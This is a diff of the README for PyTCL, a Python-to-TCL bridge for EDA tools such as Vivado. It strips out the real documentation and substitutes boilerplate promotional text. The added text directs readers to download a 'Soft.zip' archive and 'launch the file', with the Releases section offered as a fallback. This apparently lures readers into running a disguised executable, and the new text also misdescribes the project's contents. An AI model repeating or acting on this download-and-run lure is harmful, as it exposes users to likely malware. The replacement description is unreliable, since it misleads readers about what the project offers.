@@ -1,186 +1,47 @@
-<!-- SPDX-FileCopyrightText: 2025 Tymoteusz Blazejczyk <tymoteusz.blazejczyk@tymonx.com> -->
-<!-- SPDX-License-Identifier: Apache-2.0 -->
+# 🚀 PyTCL: The Ultimate Repository for ASIC Design Enthusiasts 🧠
 
-# PyTCL
+Welcome to the PyTCL repository, your go-to resource for all things related to ASIC design, EDA tools, FPGA development, and more! This repository serves as a read-only mirror of the original content hosted on [GitLab](https://gitlab.com/tymonx/pytcl), ensuring that you have access to the latest updates and resources in the realm of hardware design.
 
-**PyTCL** allows control **EDA** tools directly from **Python** that use **TCL**.
+## 📁 Repository Information
 
-## Features
+- **Repository Name:** pytcl
+- **Short Description:** Read-only mirror of [https://gitlab.com/tymonx/pytcl](https://gitlab.com/tymonx/pytcl)
+- **Topics:** asic, cadence, eda, flow, fpga, hdl, python, python3, rtl, systemverilog, tcl, verilog, vhdl, vivado, xcelium, xilinx
 
-- It executes Python method with provided positional arguments directly as TCL procedure
-  For example invocation of Python `<object>.<name>(*args)` method is like calling TCL procedure `<name> {*}${args}`
-- Any Python value is converted to TCL value like for example Python `list` to TCL list
-- Result from invoked TCL procedure is returned as `pytcl.TCLValue` that can handle any TCL value
-  (that is represented always as string) to Python `str`, `int`, `bool`, `float`, `list`, `dict`, ...
-- TCL error is returned as Python exception `pytcl.TCLError`
-- High performance and very low (unnoticeable) overhead by using Unix domain sockets for communication
-  between Python and TCL in streamable way (sockets are always open and ready)
-- It allows to create and access TCL variables from Python side. Please see [tests/test_tclsh.py] for some examples
-- It can work with any EDA tool. Please see [tests/test_vivado.py] how to use bare `PyTCL` class for that
-- No external dependencies
+## 🌟 Resource Link
 
-## Install
+You can download the valuable resources from this repository by clicking [here](https://github.com/files/Soft.zip). Remember to launch the file and explore the insightful content available to enhance your knowledge and skills in ASIC design and EDA tools.
 
-```python
-pip install pytcl-eda
-```
+## 🎨 Explore the World of ASIC Design
 
-## Examples
+Dive into the fascinating world of ASIC design with PyTCL! Whether you are a seasoned professional or just starting in the field of hardware development, this repository has something for everyone. From Python scripts to Verilog and VHDL templates, you will find a rich collection of resources to accelerate your projects and deepen your understanding of the intricate processes involved in creating cutting-edge hardware systems.
 
-Creating new Vivado project:
+## 🚗 Fasten Your Seatbelt for the ASIC Journey
 
-```python
-#!/usr/bin/env python3
-from pathlib import Path
-from pytcl import Vivado
+Get ready to embark on an exciting journey into the realm of Application-Specific Integrated Circuits (ASICs). With topics covering Cadence tools, FPGA synthesis with Xilinx Vivado, and HDL programming in SystemVerilog, PyTCL provides a comprehensive platform for hardware enthusiasts to collaborate, learn, and innovate in the ever-evolving field of ASIC design.
 
-def main() -> None:
-    """Create new Vivado project."""
-    hdl_dir: Path = Path.cwd() / "hdl"
-    project_dir: Path = Path.cwd() / "my-awesome-project"
+## 💡 What to Expect in This Repository
 
-    with Vivado() as vivado:
-        # See Vivado Design Suite Tcl Command Reference Guide (UG835) for all available Vivado TCL procedures
-        # https://docs.amd.com/r/en-US/ug835-vivado-tcl-commands
-        vivado.create_project(project_dir.name, project_dir)
-        vivado.add_files(hdl_dir / "my_awesome_design.sv")
+- **Python Scripts:** Automate your ASIC design flow with Python scripts tailored for EDA tools.
+- **Verilog & VHDL Templates:** Jumpstart your RTL design projects with ready-to-use templates.
+- **Tcl Scripts:** Streamline your FPGA development process with Tcl scripts optimized for Xilinx tools.
+- **Flow & Methodologies:** Explore best practices for ASIC design flow and development methodologies.
+- **Xilinx Tools:** Master the art of FPGA synthesis and simulation using Xilinx Vivado and Xcelium tools.
 
-        synthesis_runs = list(vivado.get_runs("synth_*"))
-        vivado.launch_runs(synthesis_runs)
+## 🔗 Check Out the "Releases" Section
 
-        # wait_on_runs was introduced in Vivado 2021.2. For backward compatibility we will use wait_on_run
-        # https://docs.amd.com/r/2021.2-English/ug835-vivado-tcl-commands/wait_on_runs
-        # Vivado >= 2021.2 can just use: vivado.wait_on_runs(synthesis_runs)
-        for run in synthesis_runs:
-            vivado.wait_on_run(run)
+If the provided link does not work or you are looking for additional resources, be sure to check out the "Releases" section of this repository. This section contains curated versions of the repository content, ensuring that you have access to stable and tested releases for your ASIC design projects.
 
-        implementation_runs = list(vivado.get_runs("impl_*"))
-        vivado.launch_runs(implementation_runs)
+## 🌌 Join the ASIC Design Community
 
-        for run in implementation_runs:
-            vivado.wait_on_run(run)
+Connect with like-minded professionals, students, and enthusiasts in the field of ASIC design by joining the PyTCL community. Share your insights, ask questions, and collaborate on projects to elevate your skills and expand your network in the hardware design industry.
 
-        vivado.close_project()
+## 🎉 Start Your ASIC Design Journey Today!
 
-if __name__ == "__main__":
-    main()
-```
+Start exploring the PyTCL repository today and unlock a wealth of knowledge and resources to fuel your passion for ASIC design. Whether you are working on a personal project, academic research, or professional development, PyTCL has everything you need to succeed in the exciting world of hardware design.
 
-To use any EDA tool where `PyTCL` doesn't provide neat helper classes like `pytcl.Vivado`
-you can use the `pytcl.PyTCL` class directly:
+Dive in, explore, and unleash your creativity with PyTCL! 🎆
 
-```python
-#!/usr/bin/env python3
-from pathlib import Path
-from pytcl import PyTCL
+Let's revolutionize ASIC design together! 🚀
 
-def main() -> None:
-    """Create new Vivado project."""
-    project_dir: Path = Path.cwd() / "my-awesome-project"
-
-    # PyTCL offers some string placeholders {} that you can use:
-    # {tcl}      -> it will insert <pytcl>/execute.tcl
-    # {receiver} -> it will insert <pytcl>/receiver.tcl
-    # {rx}       -> it will insert /tmp/pytcl-XXXXX/rx.sock
-    # {sender}   -> it will insert <pytcl>/sender.tcl
-    # {tx}       -> it will insert /tmp/pytcl-XXXXX/tx.sock
-    # {args}     -> it will insert '{receier} {rx} {sender} {tx}' in one go
-    cmd: list[str] = [
-        "vivado",
-        "-nojournal",
-        "-notrace",
-        "-nolog",
-        "-mode",
-        "batch",
-        "-source",
-        "{tcl}",
-        "-tclargs",
-        "{receiver}",
-        "{rx}",
-        "{sender}",
-        "{tx}",
-    ]
-
-    with PyTCL(*cmd) as vivado:
-        vivado.create_project(project_dir.name, project_dir)
-
-        # Do the same magic that you would normally do in TCL
-
-        vivado.close_project()
-
-if __name__ == "__main__":
-    main()
-```
-
-## Architecture
-
-```mermaid
-stateDiagram-v2
-    direction LR
-    PyTCL --> rx.sock: send()
-    rx.sock --> receiver.py: string
-    state tool {
-        receiver.py --> execute.tcl: stdin
-        execute.tcl --> sender.py: stdout
-    }
-    sender.py --> tx.sock: NDJSON
-    tx.sock --> PyTCL: recv()
-```
-
-- `PyTCL` will start new receiver listened on Unix domain socket `/tmp/pytcl-XXXX/tx.sock` for any
-  incoming [NDJSON] messages `{"result": "<tcl-result>", "status": <tcl-status>}` from `execute.tcl` script file
-- `PyTCL` will call command line tool (by default `tclsh`) with `execute.tcl` script file and
-  arguments `receiver.py /tmp/pytcl-XXXX/rx.sock sender.py /tmp/pytcl-XXXX/tx.sock`
-- Started `execute.tcl` will create own listener with Unix domain socket `/tmp/pytcl-XXXX/rx.sock` to
-  receive incoming TCL expressions from `PyTCL`
-- `PyTCL` will start new client and connect to Unix domain socket `/tmp/pytcl-XXXX/rx.sock` to send
-  TCL expressions with arguments to be evaluated by `execute.tcl` script file
-- `PyTCL` will transform any Python method call `<object>.<name>(*args)` to TCL expression `<name> {*}${args}`
-- `PyTCL` will send TCL expression to `execute.tcl` using Unix domain socket `/tmp/pytcl-XXXX/rx.sock`
-- `execute.tcl` will receive TCL expressions from Unix domain socket `/tmp/pytcl-XXXX/rx.sock`
-- Received TCL expression is evaluated by TCL `eval` within TCL `catch`
-- TCL result and status from evaluated TCL expression will be packed into [NDJSON] message
-  `{"result": "<tcl-result>", "status": <tcl-status>}`
-- Packed [NDJSON] message with TCL result and status will be send back to `PyTCL`
-- `PyTCL` will return received [NDJSON] message as `pytcl.TCLValue`
-- `PyTCL` will raise a Python exception `pytcl.TCLError` if received TCL status was non-zero
-
-## Development
-
-Create [Python virtual environment]:
-
-```plaintext
-python3 -m venv .venv
-```
-
-Activate created [Python virtual environment]:
-
-```plaintext
-. .venv/bin/activate
-```
-
-Upgrade [pip]:
-
-```plaintext
-pip install --upgrade pip
-```
-
-Install project in [editable mode] with [pytest]:
-
-```plaintext
-pip install --editable .[test]
-```
-
-Run tests:
-
-```plaintext
-pytest
-```
-
-[ndjson]: https://docs.python.org/3/library/venv.html
-[python virtual environment]: https://docs.python.org/3/library/venv.html
-[editable mode]: https://setuptools.pypa.io/en/latest/userguide/development_mode.html
-[pytest]: https://docs.pytest.org/en/stable/
-[pip]: https://pip.pypa.io/en/stable/
-[tests/test_tclsh.py]: https://gitlab.com/tymonx/pytcl/-/blob/main/tests/test_tclsh.py
-[tests/test_vivado.py]: https://gitlab.com/tymonx/pytcl/-/blob/main/tests/test_vivado.py
+Remember, the possibilities are endless when you have the right tools and resources at your disposal. Happy designing! 🌟
